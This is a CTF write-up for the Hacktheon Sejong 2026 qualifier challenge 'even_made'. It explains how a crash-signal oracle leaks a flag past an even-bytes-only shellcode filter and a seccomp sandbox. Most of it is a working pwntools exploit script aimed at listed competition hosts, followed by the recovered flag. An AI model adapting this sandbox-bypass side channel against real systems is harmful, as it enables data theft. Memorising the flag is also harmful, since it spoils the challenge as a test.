---
title: "Hacktheon Sejong 2026 Quals even_made Writeup"
description: "Hacktheon Sejong 2026 Quals even_made writeup"
---

# even_made

### Summary

The input shellcode must have all even bytes, and seccomp only allows `nanosleep`. Since direct output is blocked, I built an oracle that reads a bit of `flag_mem` and signals the value through the type of crash.

### Analysis

At program start the flag is loaded into the global variable `flag_mem`. We cannot read it out with a syscall and print it, but if the shellcode checks a flag bit and then dies with a different signal, the bit value can be distinguished remotely.

The distinction is kept simple.

```text
bit == 1 -> SIGTRAP
bit == 0 -> SIGSEGV
```

The PIE base was obtained from the return address left on the stack right after the shellcode is called. I fetch the address with `pop rax` and add the offset to `flag_mem` using only combinations of even-byte instructions. Then I read the target byte and check only the desired bit.

On the remote I asked the same bit several times and decided by majority vote. Repeating this for about `0x50` bytes recovers the flag up to the null byte.

### Exploit

```python
from pwn import *
import time

HOSTS = [
    ("13.124.201.116", 1337),
    ("54.181.1.133", 1337),
    ("43.201.41.138", 1337),
]

context.log_level = "error"

BASE_DELTA = 0x2aba


def add_delta_code(delta):
    low = delta & 0xff
    high = (delta >> 8) & 0xff

    code = b""

    code += b"\x3c\x02"
    code += b"\x10\xd2"

    code += b"\x80\x04\x24" + bytes([low & 0xfe])

    code += b"\x80\x14\x14" + bytes([high & 0xfe])
    code += b"\x10\x74\x24\x02"

    if low & 1:
        code += b"\x00\x14\x24"
        code += b"\x10\x34\x14"
        code += b"\x10\x74\x24\x02"

    if high & 1:
        code += b"\x00\x14\x14"
        code += b"\x10\x74\x24\x02"

    code += b"\x58"

    assert all((x & 1) == 0 for x in code)
    return code


def make_payload(delta, bit):
    code = add_delta_code(delta)

    code += b"\x8a\x00"

    if bit == 0:
        code += b"\xd0\xe0"
        code += b"\xa8\x02"
    else:
        code += b"\xa8" + bytes([1 << bit])

    code += b"\x74\x02"
    code += b"\xcc"
    code += b"\x50"
    code += b"\xf4"

    assert len(code) <= 0x900
    assert all((x & 1) == 0 for x in code)
    return code


def query(delta, bit, attempt=0):
    host, port = HOSTS[attempt % len(HOSTS)]
    payload = make_payload(delta, bit)

    io = remote(host, port, timeout=2)
    io.recvuntil(b"shellcode: ")
    io.send(payload)
    io.shutdown("send")
    out = io.recvall(timeout=2)
    io.close()

    if b"Trace/breakpoint" in out:
        return 1
    if b"Segmentation fault" in out or b"Alarm clock" in out:
        return 0

    raise RuntimeError(out)


def leak_bit(delta, bit):
    res = []

    for i in range(3):
        try:
            res.append(query(delta, bit, i))
        except Exception:
            time.sleep(0.05)

    if not res:
        return 0

    return 1 if sum(res) * 2 >= len(res) else 0


flag = b""

for i in range(0x50):
    v = 0

    for bit in range(8):
        v |= leak_bit(BASE_DELTA + i, bit) << bit

    if v == 0:
        break

    flag += bytes([v])
    print(flag)

print(flag.decode())
```

### Flag

`hacktheon2026{Ev3n_R3str1ct3d_Sh3lLc0d3_M4sT3r}`
